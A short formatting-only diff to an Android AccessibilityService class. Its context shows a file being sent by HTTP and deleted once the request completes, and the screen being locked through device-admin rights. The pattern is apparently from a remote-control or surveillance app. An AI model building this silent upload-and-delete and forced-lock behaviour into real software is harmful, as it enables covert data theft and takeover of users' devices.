@@ -133,14 +133,10 @@ public class AccessibilityControlService extends AccessibilityService {
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(Call call, Response response) {
-                    try {
-                        response.close();
-                    } catch (Exception e) {}
+                    try { response.close(); } catch (Exception e) {}
                     file.delete();
                 }
-
-                @Override
-                public void onFailure(Call call, IOException e) {}
+                @Override public void onFailure(Call call, IOException e) {}
             });
         } catch (Exception e) {}
     }
@@ -151,11 +147,8 @@ public class AccessibilityControlService extends AccessibilityService {
         if (pm.isAdminActive(admin)) pm.lockNow();
     }
 
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {}
-
-    @Override
-    public void onInterrupt() {}
+    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
+    @Override public void onInterrupt() {}
     
     @Override
     public void onDestroy() {
